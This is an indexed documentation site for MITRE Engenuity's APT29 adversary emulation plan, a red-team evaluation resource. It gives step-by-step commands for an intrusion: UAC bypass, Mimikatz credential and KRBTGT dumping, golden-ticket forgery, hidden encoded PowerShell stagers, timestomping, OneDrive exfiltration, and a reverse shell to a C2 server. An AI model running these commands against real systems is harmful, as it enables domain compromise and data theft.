[[{"l":"Welcome","p":["✅ Your website is working.","but... this is a placeholder Welcome page.","To replace this placeholder page, create a readme.md file and add it to the root of your project.","You can name the file index.md, default.md, readme.md, or welcome.md."]},{"l":"Settings","p":["Check out the following Project settings to customize your website."]},{"l":"Set the project name","p":["Customize your Project Name by setting the title in your retype.yml file:","Or, use your logo:","Create a /static folder and then add a copy of your-logo.png file to that new folder. You can name the folder and file whatever you want, such as /images/my-logo.png."]},{"l":"Set the URL","p":["Improve your website Search Engine Optimization (SEO) by setting the url in your retype.yml file:"]},{"l":"Add top links","p":["Add custom links to the top navigation:"]},{"l":"Help","p":["Need some help with Retype?","A live support person is generally available on chat on the retype.com website.","If you find a defect or would like to submit a feature request, please create an Issue and we will investigate right away.","Do you have a general inquiry? Please feel free to contact us at hello@retype.com.","We ❤️ your feedback."]}],[{"l":"Enterprise"}],[{"l":"APT29 Adversary Emulation","p":["This adversary emulation plan is derived from the original APT29 content developed and used in the 2019 ATT&CK Evaluations. It's format has been updated in collaboration with the Center for Threat-Informed Defense to consolidate MITRE Engenuity emulation resources under a single Adversary Emulation Library, and further standardize plan formats.","APT29 is thought to be an organized and well-resourced cyber threat actor whose collection objectives appear to align with the interests of the Russian Federation. 1, 14 The group is reported to have been operating as early as 2008 and may have logged operational successes as recently as 2020.","The Intelligence Summary summarizes 16 publicly available sources as well as the results of an open call for contributions, to describe APT29, their motivations, objectives, and observed target industries. It further describes a representative APT29 Operational Flow along with their publicly attributed Tactics, Techniques, and Procedures (TTPs) mapped to ATT&CK.","The Operations Flow chains techniques together into a logical order that commonly occur across APT29 operations. In the case of APT29, we break out their operations into two distinct scenarios:","Scenario 1: This scenario starts with a \"smash-and-grab\" then rapid espionage mission that focuses on gathering and exfiltrating data, before transitioning to stealthier techniques to achieve persistence, further data collection, credential access, and lateral movement. The scenario ends with the execution of previously established persistence mechanisms.","Scenario 2: This scenario consists of a stealthier and slower approach to compromising the initial target, establishing persistence, harvesting credentials, then finally enumerating and compromising the entire domain. The scenario ends with a simulated time-lapse where previously established persistence mechanisms are executed.","The APT29 emulation plan is a human-readable, step-by-step / command-by-command implementation of APT29 TTPs. Structurally, the plan is organized into an infrastructure section, and two scenarios, as defined in the Operations Flow. The infrastructure section explains how to prepare the environment to execute both scenarios. The human-readable plan is accompanied by a machine-readable plan implemented in YAML. The YAML includes all steps, commands, and syntax for both Scenario 1 and Scenario 2. The YAML template was nuanced to ensure that each step within the YAML is directly coupled with its equivalent in the human-readable version."]},{"l":"Resources","p":["Please note that binary files hosted in Scenario_1 and Scenario_2 have been added to password protected zip files. The password for these files is \"malware.\""]},{"l":"Acknowledgements","p":["We would like to formally thank the people that contributed to the content, review, and format of this document. This includes the MITRE ATT&CK and MITRE ATT&CK Evaluations teams, the organizations and people that provided public intelligence and resources, as well as the following organizations that participated in the community cyber threat intelligence contribution process:","Kaspersky","Microsoft","SentinelOne"]},{"l":"Table of Contents","p":["Intelligence Summary","Operations Flow","Emulation Plan","Scenario 1 - Infrastructure","Scenario 1","Scenario 2 - Infrastructure","Scenario 2","YAML","Archive","Issues","Change Log"]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Copyright 2021 MITRE Engenuity. Approved for public release. Document number AT0008.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CK®","ATT&CK Terms of Use"]}],[{"l":"APT29 Adversary Emulation","p":["This adversary emulation plan is derived from the original APT29 content developed and used in the 2019 ATT&CK Evaluations. It's format has been updated in collaboration with the Center for Threat-Informed Defense to consolidate MITRE Engenuity emulation resources under a single Adversary Emulation Library, and further standardize plan formats.","APT29 is thought to be an organized and well-resourced cyber threat actor whose collection objectives appear to align with the interests of the Russian Federation. 1, 14 The group is reported to have been operating as early as 2008 and may have logged operational successes as recently as 2020.","The Intelligence Summary summarizes 16 publicly available sources as well as the results of an open call for contributions, to describe APT29, their motivations, objectives, and observed target industries. It further describes a representative APT29 Operational Flow along with their publicly attributed Tactics, Techniques, and Procedures (TTPs) mapped to ATT&CK.","The Operations Flow chains techniques together into a logical order that commonly occur across APT29 operations. In the case of APT29, we break out their operations into two distinct scenarios:","Scenario 1: This scenario starts with a \"smash-and-grab\" then rapid espionage mission that focuses on gathering and exfiltrating data, before transitioning to stealthier techniques to achieve persistence, further data collection, credential access, and lateral movement. The scenario ends with the execution of previously established persistence mechanisms.","Scenario 2: This scenario consists of a stealthier and slower approach to compromising the initial target, establishing persistence, harvesting credentials, then finally enumerating and compromising the entire domain. The scenario ends with a simulated time-lapse where previously established persistence mechanisms are executed.","The APT29 emulation plan is a human-readable, step-by-step / command-by-command implementation of APT29 TTPs. Structurally, the plan is organized into an infrastructure section, and two scenarios, as defined in the Operations Flow. The infrastructure section explains how to prepare the environment to execute both scenarios. The human-readable plan is accompanied by a machine-readable plan implemented in YAML. The YAML includes all steps, commands, and syntax for both Scenario 1 and Scenario 2. The YAML template was nuanced to ensure that each step within the YAML is directly coupled with its equivalent in the human-readable version."]},{"l":"Acknowledgements","p":["We would like to formally thank the people that contributed to the content, review, and format of this document. This includes the MITRE ATT&CK and MITRE ATT&CK Evaluations teams, the organizations and people that provided public intelligence and resources, as well as the following organizations that participated in the community cyber threat intelligence contribution process:","Kaspersky","Microsoft","SentinelOne"]},{"l":"Table of Contents","p":["Intelligence Summary","Operations Flow","Emulation Plan","Scenario 1 - Infrastructure","Scenario 1","Scenario 2 - Infrastructure","Scenario 2","YAML","Archive","Issues","Change Log"]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Copyright 2020 MITRE Engenuity. Approved for public release. Document number AT0008.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CK®","ATT&CK Terms of Use"]}],[{"l":"Preface","p":["APT29 operations have been separated into two scenarios, with steps and granular procedures contained within each. Within each scenario, operations have been broken into specific objectives, which are presented linearly as each enables subsequent objectives. That said, each organization can tailor this emulation to their individual use case, priorities, and available resources. The assessing team can begin at any scenario or objective but should do so understanding that each objective enables succeeding objectives."]},{"l":"Scenario 2 Overview","p":["Emulation of APT29 usage of tools such as PowerDuke, POSHSPY, CloudDuke, as well as more recent (2016+) TTPs","Scenario begins with a target spearphishing leading into a low and slow, methodical approach to owning the initial target and eventually the entire domain","Includes establishing persistence, credential gathering, local and remote enumeration, and data exfil","Modular components (ex: PowerShell scripts) may be executed atomically"]},{"l":"Contents","p":["Step 11 - Initial Breach","Step 12 - Fortify Access","Step 13 - Local Enumeration","Step 14 - Elevation","Step 15 - Establish Persistence","Step 16 - Lateral Movement","Step 17 - Collection","Step 18 - Exfiltration","Step 19 - Clean Up","Step 20 - Leverage Persistence","Acknowledgements","Additional Plan Resources"]},{"l":"Pre-requisites","p":["Prior to beginning the following emulation Scenario, ensure you have the proper infrastructure requirements and configuration in place as stated in the Scenario 2 Infrastructure documentation."]},{"i":"step-11---initial-breach","l":"Step 11 - Initial Breach","p":["The scenario begins with initial breach, where a legitimate user clicks ( T1204/ T1204.002) a link file payload, which executes an alternate data stream (ADS) hidden on another dummy file ( T1096/ T1564.004) delivered as part of the spearphishing campaign. The ADS performs a series of enumeration commands to ensure it is not executing in a virtualized analysis environment ( T1497/ T1497.001, T1082, T1120, T1033, T1016, T1057, T1083) before establishing persistence via a Windows Registry Run key entry ( T1060/ T1547.001) pointing to an embedded DLL payload that was decoded and dropped to disk ( T1140). The ADS then executes a PowerShell stager ( T1086/ T1059.001) which creates a C2 connection over port 443 ( T1043) using the HTTPS protocol ( T1032/ T1573.002, T1071/ T1071.001)."]},{"l":"Procedures"},{"i":"11a---user-execution-malicious-file-t1204--t1204002","l":"11.A - User Execution: Malicious File (T1204 / T1204.002)","p":["As non-domain admin user, execute 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk(double click), output will display in terminal","You will now receive a new, low integrity callback"]},{"l":"Cited Intelligence","p":["Open Invitation Contributor: Microsoft","APT29 has used several persistence mechanisms, including, Registry run keys. 5, 11","APT29 phishing campaigns have contained weaponized Windows shortcut files that executed an obfuscated PowerShell command from within the file and dropped a DLL to the victim’s system. 8, 11, 16","PowerDuke has performed anti-VM checks designed to avoid executing in virtualized environments. PowerDuke payloads have also contained a component hidden in an ADS and connected to C2 over port 443. 11","Note: The anti-analysis commands and logic were derived from a VirusTotal submission. 9"]},{"i":"step-12---fortify-access","l":"Step 12 - Fortify Access","p":["The attacker modifies the time attributes of the DLL payload ( T1099/ T1070.006) used in the previously established persistence mechanism to match that of a random file found in the victim’s System32 directory ( T1083). The attacker then enumerates registered AV products ( T1063/ T1518.001) and software installed by the user documented in the Windows Registry ( T1012)."]},{"i":"procedures-1","l":"Procedures"},{"i":"12a---indicator-removal-on-host-timestomp-t1099--t1070006","l":"12.A - Indicator Removal on Host: Timestomp (T1099 / T1070.006)","p":["Load timestomp.ps1","Execute timestomp C:\\Users\\oscar\\AppData\\Roaming\\Microsoft\\kxwn.lock"]},{"i":"12b---software-discovery-security-software-discovery-t1063--t1518001","l":"12.B - Software Discovery: Security Software Discovery (T1063 / T1518.001)","p":["Load stepTwelve.ps1","Execute detectav"]},{"i":"12c---software-discovery-t1518--t1518001","l":"12.C - Software Discovery (T1518 / T1518.001)","p":["Execute software"]},{"i":"cited-intelligence-1","l":"Cited Intelligence","p":["Open Invitation Contributors: Kaspersky, SentinelOne","POSHSPY can modify standard information timestamps of downloaded executables to match a randomly selected file from the System32 directory. PowerDuke also has had undescribed commands named \"detectav” and \"software.\" 10"]},{"i":"step-13---local-enumeration","l":"Step 13 - Local Enumeration","p":["The attacker performs local enumeration using various Windows API calls, specifically gathering the local computer name ( T1082), domain name ( T1016), current user context ( T1033), and running processes ( T1057)."]},{"i":"procedures-2","l":"Procedures"},{"i":"13a---system-information-discovery-t1082","l":"13.A - System Information Discovery (T1082)","p":["Load stepThirteen.ps1","Execute comp"]},{"i":"13b---system-network-configuration-discovery-t1016","l":"13.B - System Network Configuration Discovery (T1016)","p":["Execute domain"]},{"i":"13c---system-owneruser-discovery-t1033","l":"13.C - System Owner/User Discovery (T1033)","p":["Execute user"]},{"i":"13d---process-discovery-t1057","l":"13.D - Process Discovery (T1057)","p":["Execute pslist"]},{"i":"cited-intelligence-2","l":"Cited Intelligence","p":["PowerDuke can get the NetBIOS name, the computer’s domain name, user’s name, and process list via select Windows API calls. 11"]},{"i":"step-14---elevation","l":"Step 14 - Elevation","p":["The attacker elevates privileges via a user account control (UAC) bypass ( T1122/ T1546.015, T1088/ T1548.002). The attacker then uses the new elevated access to create and execute code within a custom WMI class ( T1047) that downloads ( T1105) and executes Mimikatz to dump plain-text credentials ( T1003/ T1003.001), which are parsed, encoded, and stored in the WMI class ( T1027). After tracking that the WMI execution has completed ( T1057), the attacker reads the plaintext credentials stored within the WMI class ( T1140)."]},{"i":"procedures-3","l":"Procedures"},{"i":"14a---abuse-elevation-control-mechanism-bypass-user-access-control-t1088--t1548002","l":"14.A - Abuse Elevation Control Mechanism: Bypass User Access Control (T1088 / T1548.002)","p":["Load stepFourteen_bypassUAC.ps1","Execute bypass","You will now receive a new, high integrity callback"]},{"i":"14b---os-credential-dumping-lsass-memory-t1003--t1003001","l":"14.B - OS Credential Dumping: LSASS Memory (T1003 / T1003.001)","p":["Go to where m.exe is on C2 server in another terminal","Confirm m.exe is there and is a Windows PE ($ file m)","m.exe is a copy of the Mimikatz executable (available at https://github.com/gentilkiwi/mimikatz)","Host file on port 8080 ($ sudo python -m SimpleHTTPServer 8080)","Interact with new callback","Load stepFourteen_credDump.ps1","Execute wmidump","Kill the python server (CTRL-C) once you see a GET request on the python server (VM terminal)"]},{"i":"cited-intelligence-3","l":"Cited Intelligence","p":["Open Invitation Contributors: Microsoft, SentinelOne","APT29 has embedded and encoded PowerShell scripts in WMI class properties. 5, 10","APT29 has bypassed UAC to elevate privileges. 5","APT29 has used WMI to store and run Invoke-Mimikatz (ATT&CK S0002) on remote hosts. 7, 12","POSHSPY has used WMI to both store and persist PowerShell backdoor code. POSHSPY can also download and execute additional PowerShell code and Windows binaries. 7, 10, 12"]},{"i":"step-15---establish-persistence","l":"Step 15 - Establish Persistence","p":["The attacker establishes a secondary means of persistent access to the victim by creating a WMI event subscription ( T1084/ T1546.003) to execute a PowerShell payload whenever the current user ( T1033) logs in."]},{"i":"procedures-4","l":"Procedures"},{"i":"15a---event-triggered-execution-windows-management-instrumentation-event-subscription-t1084--t1546003","l":"15.A - Event Triggered Execution: Windows Management Instrumentation Event Subscription (T1084 / T1546.003)","p":["Load stepFifteen_wmi.ps1","Execute wmi","Note: Do not RDP into the initial access from this point forward, you will trigger callbacks intended for step 20"]},{"i":"cited-intelligence-4","l":"Cited Intelligence","p":["Open Invitation Contributors: Microsoft, SentinelOne","APT29 has used several persistence mechanisms, including WMI backdoors that execute PowerShell components. 5, 10"]},{"i":"step-16---lateral-movement","l":"Step 16 - Lateral Movement","p":["The attacker enumerates the environment’s domain controller ( T1018) and the domain’s security identifier (SID) ( T1033) via the Windows API ( T1106). Next, the attacker uses the previously dumped credentials ( T1078/ T1078.002) to create a remote PowerShell session to the domain controller ( T1028/ T1021.006). Through this connection, the attacker copies the Mimikatz binary used in Step 14 to the domain controller ( T1105/ T1570) then dumps the hash of the KRBTGT account ( T1003/ T1003.001)."]},{"i":"procedures-5","l":"Procedures"},{"i":"16a---remote-system-discovery-t1018","l":"16.A - Remote System Discovery (T1018)","p":["Interact with low integrity callback","Load powerView.ps1(available at https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)","Execute get-netdomaincontroller"]},{"i":"16b---system-owneruser-discovery-t1033","l":"16.B - System Owner/User Discovery (T1033)","p":["Load stepSixteen_SID.ps1","Execute siduser","Save the value for the domain SID (ex: S-1-5-21-2219224806-3979921203-557828661-1110) and delete the RID (ex: -1110) of the end (ex: S-1-5-21-2219224806-3979921203-557828661)"]},{"i":"16c---remote-services-windows-remote-management-t1028--t1021006","l":"16.C - Remote Services: Windows Remote Management (T1028 / T1021.006)","p":["Interact with high integrity callback","Load Invoke-WinRMSession.ps1(available at https://github.com/nettitude/PoshC2/blob/master/resources/modules/Invoke-WinRMSession.ps1)","Execute invoke-winrmsession -Username [insert domain admin username] -Password [insert domain admin password] -IPAddress [insert domain controller IP]","Output will tell you a session opened and give you the format for using it, ex: Session opened, to run a command do the following: Invoke-Command -Session $[session_id] -scriptblock {Get-Process} | out-string","Save the value for the session_id (ex: $hzaqx)","Note: If you get an error here, reboot domain controller, then re-run the 2 winrm setup commands before re-executing 16.C"]},{"i":"16d---os-credential-dumping-t1003--t1003001","l":"16.D - OS Credential Dumping (T1003 / T1003.001)","p":["Execute Copy-Item m.exe -Destination C:\\Windows\\System32\\ -ToSession $[session_id]","m.exe is a copy of the Mimikatz executable (available at https://github.com/gentilkiwi/mimikatz)","Execute Invoke-Command -Session $[session_id] -scriptblock {C:\\Windows\\System32\\m.exe privilege::debug lsadump::lsa /inject /name:krbtgt exit} | out-string","Take note of value for the NTLM hash (ex: NTLM : f4a688010d80770a55a22893dc6ac510) near the top (Under RID and User after * Primary)","Execute Get-PSSession | Remove-PSSession"]},{"i":"cited-intelligence-5","l":"Cited Intelligence","p":["Open Invitation Contributors: Microsoft, SentinelOne","PowerDuke can get the current user’s SID via select Windows API calls. 11"]},{"i":"step-17---collection","l":"Step 17 - Collection","p":["The attacker harvests emails stored in the local email client ( T1114/ T1114.001) before collecting ( T1005) and staging ( T1074/ T1074.001) a file of interest. The staged file is compressed ( T1002/ T1560.001) as well as prepended with the magic bytes of the GIF file type ( T1027)."]},{"i":"procedures-6","l":"Procedures"},{"i":"17a---email-collection-local-email-collection-t1114--t1114001","l":"17.A - Email Collection: Local Email Collection (T1114 / T1114.001)","p":["Interact with low integrity callback","Load stepSeventeen_email.ps1","Execute psemail"]},{"i":"17b---data-from-local-system-t1005","l":"17.B - Data from Local System (T1005)","p":["Interact with high integrity callback","Execute New-Item -Path C:\\Windows\\Temp\\ -Name WindowsParentalControlMigration -ItemType directory","Execute Copy-Item C:\\Users\\oscar\\Documents\\MITRE-ATTACK-EVALS.HTML -Destination C:\\Windows\\Temp\\WindowsParentalControlMigration"]},{"i":"17c---obfuscated-files-or-information-t1027","l":"17.C - Obfuscated Files or Information (T1027)","p":["Load stepSeventeen_zip.ps1","Execute zip C:\\Windows\\Temp\\WindowsParentalControlMigration.tmp C:\\Windows\\Temp\\WindowsParentalControlMigration"]},{"i":"cited-intelligence-6","l":"Cited Intelligence","p":["Open Invitation Contributors: Kaspersky, Microsoft","APT29 has used the legit Microsoft DLL and PowerShell to interact with Exchange Web Services (EWS) for email theft. 7","POSHSPY can appended a file signature header to all encrypted data prior to upload or download. 10"]},{"i":"step-18---exfiltration","l":"Step 18 - Exfiltration","p":["The attacker maps a local drive to an online web service account ( T1102) then exfiltrates the previous staged data to this repository ( T1048/ T1567.002)."]},{"i":"procedures-7","l":"Procedures"},{"i":"18a---exfiltration-over-alternative-protocol-t1048--t1567002","l":"18.A - Exfiltration Over Alternative Protocol (T1048 / T1567.002)","p":["Get CID for OneDrive account ( https://www.laptopmag.com/articles/map-onedrive-network-drive)","Execute net use y: https://d.docs.live.net/[CID] /user:[OneDrive account]@outlook.com [OneDrive password]","Execute Copy-Item C:\\Windows\\Temp\\WindowsParentalControlMigration.tmp -Destination Y:\\WindowsParentalControlMigration.tmp","Login to https://onedrive.live.com/?id=root&cid=[CID] to see exfil ( WindowsParentalControlMigration.tmp)"]},{"i":"cited-intelligence-7","l":"Cited Intelligence","p":["Open Invitation Contributors: Kaspersky, Microsoft, SentinelOne","CloudDuke can use a Microsoft OneDrive to exchange stolen data with its operators. 1, 5"]},{"i":"step-19---clean-up","l":"Step 19 - Clean Up","p":["The attacker deletes various files ( T1107/ T1070.004) associated with that access by reflectively loading and executing the Sdelete binary ( T1055/ T1055.002) within powershell.exe."]},{"i":"procedures-8","l":"Procedures"},{"i":"19a---indicator-removal-on-host-file-deletion-t1107--t1070004","l":"19.A - Indicator Removal on Host: File Deletion (T1107 / T1070.004)","p":["Load wipe.ps1","Execute wipe C:\\Windows\\System32\\m.exe","Note: There's a known bug here with ETW (Invoke-ReflectivePEInjection patches a function on the fly that ETW invokes) so callback may die and hang."]},{"i":"19b---indicator-removal-on-host-file-deletion-t1107--t1070004","l":"19.B - Indicator Removal on Host: File Deletion (T1107 / T1070.004)","p":["Execute wipe C:\\Windows\\Temp\\WindowsParentalControlMigration.tmp"]},{"i":"19c---indicator-removal-on-host-file-deletion-t1107--t1070004","l":"19.C - Indicator Removal on Host: File Deletion (T1107 / T1070.004)","p":["Execute wipe C:\\Windows\\Temp\\WindowsParentalControlMigration\\MITRE-ATTACK-EVALS.HTML"]},{"i":"cited-intelligence-8","l":"Cited Intelligence","p":["Open Invitation Contributors: Microsoft, SentinelOne","APT29 has removed tools and forensic artifacts to hide activity, including the usage of Sdelete ( S0195). 5","PowerDuke can write random data across then delete a file. 11"]},{"i":"step-20---leverage-persistence","l":"Step 20 - Leverage Persistence","p":["The original victim is rebooted and the legitimate user logs in, emulating ordinary usage and a passage of time. This activity triggers the previously established persistence mechanisms, namely the execution of the DLL payload ( T1085/ T1218.011), referenced by the Windows Registry Run key, and the WMI event subscription ( T1084/ T1546.003), which executes a new PowerShell stager ( T1086/ T1059.001). The attacker uses the renewed access to generate a Kerberos Golden Ticket ( T1097/ T1558.001, T1558.003), using materials from the earlier breach, which is used to establish a remote PowerShell session to a new victim ( T1028/ T1021.006). Through this connection, the attacker creates a new account within the domain ( T1136/ T1136.001)."]},{"i":"procedures-9","l":"Procedures"},{"i":"20a---persistence-execution-t1085--t1218011-t1084--t1546003","l":"20.A - Persistence Execution (T1085 / T1218.011, T1084 / T1546.003)","p":["Execute restart-computer -force","Existing 2 callbacks should die","RDP and login to initial victim once it reboots","Persistence mechanisms should fire on login (1 for DLL, 1 or more for WMI event subscription)","Note: You may need to repeat login process a few times (close and reopen RDP session) for WMI execute to fire"]},{"i":"20b---use-alternate-authentication-material-pass-the-ticket-t1097--t1550001-t1550003","l":"20.B - Use Alternate Authentication Material: Pass the Ticket (T1097 / T1550.001, T1550.003)","p":["Interact with the SYSTEM PS callback (from WMI)","Execute klist purge","Load Invoke-Mimikatz.ps1(available at https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)","Execute invoke-mimikatz -command 'kerberos::golden /domain:dmevals.local /sid:[SID] /rc4:[NTLM HASH] /user:mscott /ptt' using the SID and NTLM values from earlier","Execute klist and confirm ticket is in cache","Execute Enter-PSSession [hostname of second workstation in domain]","Execute Invoke-Command -ComputerName [hostname of second workstation in domain] -ScriptBlock {net user /add toby pamBeesly3}"]},{"i":"cited-intelligence-9","l":"Cited Intelligence","p":["Open Invitation Contributors: Microsoft, SentinelOne","APT29 have used Kerberos ticket attacks for lateral movement and has created accounts to log in. 5, 7"]},{"l":"Acknowledgements"},{"i":"special-thanks-to-the-following-public-resources","l":"Special thanks to the following public resources:","p":["Atomic Red Team ( https://github.com/redcanaryco/atomic-red-team)","Mimikatz ( https://github.com/gentilkiwi/mimikatz)","Pinvoke ( http://www.pinvoke.net)","PoshC2 ( https://github.com/nettitude/PoshC2)","POSHSPY ( https://github.com/matthewdunwoody/POSHSPY)","PowerSploit ( https://github.com/PowerShellMafia/PowerSploit)","PSReflect-Functions ( https://github.com/jaredcatkinson/PSReflect-Functions)","State of the Hack S2E01: #NoEasyBreach REVISITED ( https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html)","Use PowerShell to Interact with the Windows API ( https://devblogs.microsoft.com/scripting/use-powershell-to-interact-with-the-windows-api-part-1)","Yet another sdclt UAC bypass ( http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)"]},{"l":"Additional Plan Resources","p":["Intelligence Summary","Operations Flow","Emulation Plan","Scenario 1 - Infrastructure","Scenario 1","Scenario 2 - Infrastructure","Scenario 2","YAML","Archive","Issues","Change Log"]}],[{"l":"Scenario 2 Infrastructure","p":["We hope to capture the general structure of what is reported to have been seen being used by APT29. The infrastructure listed below is specific to Scenario 2. The requirements described herein should be considered a bare minimum to execute the scenario. If you have the time and resources to remain true-to-form, you may elect to stand up multiple of each of these servers, non-contiguous IP space, etc. If you are not concerned with emulating APT29 to this degree, this level of effort is not necessary. You could for instance, phish, serve payload, and exfil from/to the same server.","Please note that binary files hosted in Scenario_1 and Scenario_2 have been added to password protected zip files. The password for these files is \"malware.\""]},{"l":"Emulation Team Infrastructure","p":["Server running an offensive framework (we tested and executed using PoshC2 -- https://github.com/nettitude/PoshC2) capable of:","Executing native PowerShell commands","Loading and executing PowerShell scripts (.ps1)","Generating a DLL payload and an encoded PowerShell oneliner","Receiving and maintaining multiple callbacks at once","Online OneDrive Account ( https://onedrive.live.com/)"]},{"l":"Emulation Team Infrastructure Configuration"},{"l":"A note about red team payloads","p":["Pre-compiled payloads are available in the resources directory; however, they are configured to connect back to static IP addresses 192.168.0.5 and 192.168.0.4."]},{"i":"generate-an-encoded-powershell-oneliner-payload-then-copy","l":"Generate an encoded PowerShell oneliner payload, then copy:","p":["Just the encoded portion (ex: WwBTAH...=) into $enc_ps variable(4th line from bottom) in schemas.ps1","ex: $enc_ps = WwBTAH...==","The entire value (ex: powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...=) into CommandLineTemplate variable (under $ConsumerArgs in 2nd paragraph) in stepFifteen_wmi.ps1","ex: CommandLineTemplate=powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...=","The entire value (ex: powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...=) into -Value variable (2nd line) in stepFourteen_bypassUAC.ps1","ex: New-Item -Force -Path HKCU:\\Software\\Classes\\Folder\\shell\\open\\command -Value powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...="]},{"i":"generate-dll-payload-then-on-a-separate-windows-host","l":"Generate DLL payload, then on a separate Windows host:","p":["[CMD] > certutil -encode [file].dll blob","[CMD] > powershell","[PS] > $blob = (Get-Content .\\blob) -join ; $blob .\\blob","Open blob file in text editor","Delete new line at end of file and copy all (CTRL-A, CTRL-C)","Paste value (ex: -----BEGIN CERTIFICATE-----...-----END CERTIFICATE-----) into $bin variable (6th line) in schemas.ps1"]},{"i":"copy-payloads-to-c2-server-wherever-is-appropriate-for-your-c2-framework-to-have-access-to-these-files","l":"Copy payloads to C2 server (wherever is appropriate for your C2 framework to have access to these files)"},{"i":"update-stepfourteen_creddumpps1----directions-are-in-file","l":"Update stepFourteen_credDump.ps1 -- directions are in file"},{"i":"prepare-initial-access-payloads","l":"Prepare initial access payloads:","p":["Login as non-domain admin user","Copy over the following files onto the Desktop of the initial victim:","2016_United_States_presidential_election_-_Wikipedia.html","make_lnk.ps1","schemas.ps1","Copy over MITRE-ATTACK-EVALS.HTML into the Documents folder of the initial victim","Execute make_lnk.ps1(Right click > Run with PowerShell), this will generate 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk","Drag make_lnk.ps1 and schemas.ps1 to Recycle Bin and empty the Recycle Bin (Right click > Empty Recycle Bin)"]},{"l":"Target Infrastructure","p":["3 targets","1 domain controller and 2 workstations","All Windows OS (tested and executed against Win10 1903)","Domain joined with at least 2 accounts (domain admin and another user)","Microsoft Outlook must be available locally on one of the victim workstations"]},{"l":"Target Infrastructure Configuration"},{"i":"for-each-of-the-three-targets","l":"For each of the three targets:","p":["Login in as domain admin user","Ensure Windows Defender is off or configured to alert-only ( https://support.microsoft.com/en-us/help/4027187/windows-10-turn-off-antivirus-protection-windows-security)","Change network type to Domain ( https://www.itechtics.com/change-network-type-windows-10/#2-_Setting_network_type_using_Windows_Registry)","Set UAC to never notify ( https://articulate.com/support/article/how-to-turn-user-account-control-on-or-off-in-windows-10)","Enable WinRM ( https://support.microsoft.com/en-us/help/555966)","Enable UseLogonCredential in the WDigest Registry settings ( https://support.microsoft.com/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a)"]},{"i":"for-the-initial-target-the-workstation-with-microsoft-outlook","l":"For the initial target (the workstation with Microsoft Outlook):","p":["Login as non-domain admin user","Enable programatic access to Microsoft Outlook ( https://www.slipstick.com/developer/change-programmatic-access-options/)","Open Outlook and sign in if necessary"]},{"l":"Additional Plan Resources","p":["Intelligence Summary","Operations Flow","Emulation Plan","Scenario 1 - Infrastructure","Scenario 1","Scenario 2 - Infrastructure","Scenario 2","YAML","Archive","Issues","Change Log"]}],[{"l":"Preface","p":["APT29 operations have been separated into two scenarios, with steps and granular procedures contained within each. Within each scenario, operations have been broken into specific objectives, which are presented linearly as each enables subsequent objectives. That said, each organization can tailor this emulation to their individual use case, priorities, and available resources. The assessing team can begin at any scenario or objective but should do so understanding that each objective enables succeeding objectives."]},{"l":"Scenario 1 Overview","p":["Emulation of APT29 usage of tools such as CosmicDuke, MiniDuke, SeaDuke/SeaDaddy, CozyDuke/CozyCar, and Hammertoss","Scenario begins after delivery of a reverse shell payload via opportunistic, widespread phishing","\"Smash-and-grab\" style collection and exfiltration before deciding the target may be of future value and deploying stealthier malware for long term exploitation","Modular components (ex: PowerShell scripts) may be executed atomically"]},{"l":"Contents","p":["Step 1 - Initial Breach","Step 2 - Rapid Collection and Exfiltration","Step 3 - Deploy Stealth Toolkit","Step 4 - Defense Evasion and Discovery","Step 5 - Persistence","Step 6 - Credential Access","Step 7 - Collection and Exfiltration","Step 8 - Lateral Movement","Step 9 - Collection","Step 10 - Persistence Execution","Acknowledgements","Additional Plan Resources"]},{"l":"Pre-requisites","p":["Prior to beginning the following emulation Scenario, ensure you have the proper infrastructure requirements and configuration in place as stated in the Scenario 1 Infrastructure documentation."]},{"i":"step-1---initial-breach","l":"Step 1 - Initial Breach","p":["The scenario begins with an initial breach, where a legitimate user clicks ( T1204/ T1204.002) an executable payload (screensaver executable) masquerading as a benign word document ( T1036/ T1036.002). Once executed, the payload creates a C2 connection over port 1234 ( T1065) using the RC4 cryptographic cipher. The attacker then uses the active C2 connection to spawn interactive cmd.exe ( T1059/ T1059.003) and powershell.exe ( T1086/ T1059.001)."]},{"l":"Procedures"},{"i":"1a---user-execution-malicious-file-t1204--t1204002","l":"1.A - User Execution: Malicious File (T1204 / T1204.002)","p":["Login to victim workstation.","Double click 3aka3.doc on Desktop","This will send a reverse shell to the Pupy C2 server."]},{"i":"1b---command-and-scripting-interpreter-powershell-t1086--t1059001","l":"1.B - Command and Scripting Interpreter: PowerShell (T1086 / T1059.001)","p":["From Pupy C2 server:","[pupy] > shell","[pupy (CMD)] > powershell"]},{"l":"Cited Intelligence","p":["Open Invitation Contributor: Kaspersky","CosmicDuke’s infection payloads have started by tricking victims into opening a Windows executable whose filename is manipulated to look like an image file using the Right-to-Left Override (RLO) feature. CosmicDuke has also used RC4 to decrypt incoming data and encrypt outgoing data. 2","SeaDuke and CozyDuke have used the RC4 cipher to encrypt data. 4, 7, 13, 15","CozyDuke can be used to 